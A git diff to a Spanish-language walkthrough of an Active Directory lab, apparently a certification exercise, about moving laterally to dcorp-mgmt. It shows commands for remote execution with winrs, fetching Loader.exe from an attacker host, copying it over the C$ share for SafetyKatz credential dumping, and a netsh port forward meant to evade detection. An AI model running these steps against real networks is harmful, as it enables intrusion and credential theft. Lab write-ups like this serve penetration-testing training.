@@ -94,15 +94,18 @@ Ahora enumeraremos a todos aquellos usuarios logeados en el dominio y si tienen 
 Find-DomainUserLocation
 ```
 
-Viendo que hay una sesión de Domain Admin en el servidor *dcorp-mgmt* y nosotros tener los privilegios de administrador local podemos intentar aprovecharnos 
-Vamos a probar a del cual nos podemos aprovechar usando *winrs* para poder ejecutar en la maquina una orden la cual nos de el nombre del equipo y usuario
+Viendo que hay una sesión de Domain Admin en el servidor *dcorp-mgmt* y nosotros tener los privilegios de administrador local podemos intentar aprovecharnos de esto para movernos lateralmente.
+Vamos a probar si nos podemos aprovechar usando *winrs* para poder ejecutar en la maquina una orden la cual nos de el nombre del equipo y usuario
 ```shell
  winrs -r:dcorp-mgmt cmd /c "set computername && set username"
 ```
 
-Ahora tenemos que extraer las credenciales de el, para ello tenemos que usar *SafetyKatz* pero primero tenemos que copiar *Loader* en *dcorp-mgmt*
+Obtenemos como respuesta el nombre de usuario *ciadmin* y el nombre del equipo *DCORP-MGMT*
 
-Primero lo descargamos en *dcorp-ci*
+Ahora tenemos que extraer las credenciales de el usuario *ciadmin*, para ello tenemos que usar *SafetyKatz* 
+Lo primero que tenemos que hacer ya que lo que hemos hecho a sido recibir una sesión a través de una reverse shell y este equipo no poder visualizarle desde muestra maquina de atacante deberemos hacer pivoting y transferir todo tunelizándolo entre dos puertos
+
+Primero cargaremos *Loader* en *dcorp-mgmt* lo descargamos en *dcorp-ci*
 ```shell
 iwr http://172.16.100.97/Loader.exe -OutFile C:\Users\Public\Loader.exe
 ```
@@ -112,7 +115,7 @@ Una vez lo tenemos aquí lo transferiremos a *dcorp-mgmt*
 echo F | xcopy C:\Users\Public\Loader.exe \\dcorp-mgmt\C$\Users\Public\Loader.exe
 ```
 
-Ahora volveremos a poder usar *winrs* para poder ejecutarlo en el equipo de *dcorp-mgmt*, en este caso para poder evitar la detección en el dominio haremos un reenvió de puertos a t
+Ahora volveremos a poder usar *winrs* para poder ejecutarlo en el equipo de *dcorp-mgmt*, en este caso para poder evitar la detección en el dominio haremos un reenvió de puertos
 ```shell
 $null | winrs -r:dcorp-mgmt "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.67"
 ```
